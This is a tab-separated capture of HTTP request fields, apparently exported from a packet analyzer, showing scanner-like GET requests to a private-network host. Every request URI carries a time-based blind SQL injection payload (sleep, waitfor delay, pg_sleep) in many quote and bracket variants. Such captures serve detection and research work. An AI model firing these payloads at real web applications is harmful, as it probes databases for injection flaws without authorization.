http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.106									97						1	http://192.168.1.106/')%20or%20sleep(5)%3d'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20or%20sleep(5)%3d'
																											192.168.1.106									98						1	http://192.168.1.106/1))%20or%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20or%20sleep(5)%23
																											192.168.1.106									99						1	http://192.168.1.106/%22))%20or%20sleep(5)%3d%22		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20or%20sleep(5)%3d%22
																											192.168.1.106									100						1	http://192.168.1.106/'))%20or%20sleep(5)%3d'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20or%20sleep(5)%3d'
																											192.168.1.106									101						1	http://192.168.1.106/1%20and%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20and%20sleep(5)%23
																											192.168.1.106									102						1	http://192.168.1.106/%22%20and%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20and%20sleep(5)%23
																											192.168.1.106									103						1	http://192.168.1.106/'%20and%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20and%20sleep(5)%23
																											192.168.1.106									104						1	http://192.168.1.106/%22%20and%20sleep(5)%3d%22		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20and%20sleep(5)%3d%22
																											192.168.1.106									105						1	http://192.168.1.106/'%20and%20sleep(5)%3d'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20and%20sleep(5)%3d'
																											192.168.1.106									106						1	http://192.168.1.106/1)%20and%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1)%20and%20sleep(5)%23
																											192.168.1.106									107						1	http://192.168.1.106/%22)%20and%20sleep(5)%3d%22		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%20and%20sleep(5)%3d%22
																											192.168.1.106									108						1	http://192.168.1.106/')%20and%20sleep(5)%3d'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20and%20sleep(5)%3d'
																											192.168.1.106									109						1	http://192.168.1.106/1))%20and%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20and%20sleep(5)%23
																											192.168.1.106									110						1	http://192.168.1.106/%22))%20and%20sleep(5)%3d%22		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20and%20sleep(5)%3d%22
																											192.168.1.106									111						1	http://192.168.1.106/'))%20and%20sleep(5)%3d'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20and%20sleep(5)%3d'
																											192.168.1.106									112						1	http://192.168.1.106/%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									113						1	http://192.168.1.106/)%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/)%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									114						1	http://192.168.1.106/'%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									115						1	http://192.168.1.106/%22%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									116						1	http://192.168.1.106/')%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									117						1	http://192.168.1.106/%22)%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									118						1	http://192.168.1.106/))%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/))%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									119						1	http://192.168.1.106/'))%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									120						1	http://192.168.1.106/%22))%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%3bwaitfor%20delay%20'0%3a0%3a5'--
																											192.168.1.106									121						1	http://192.168.1.106/pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/pg_sleep(5)--
																											192.168.1.106															1	http://192.168.1.106/1%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20or%20pg_sleep(5)--
																											192.168.1.106									128						1	http://192.168.1.106/%22%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20or%20pg_sleep(5)--
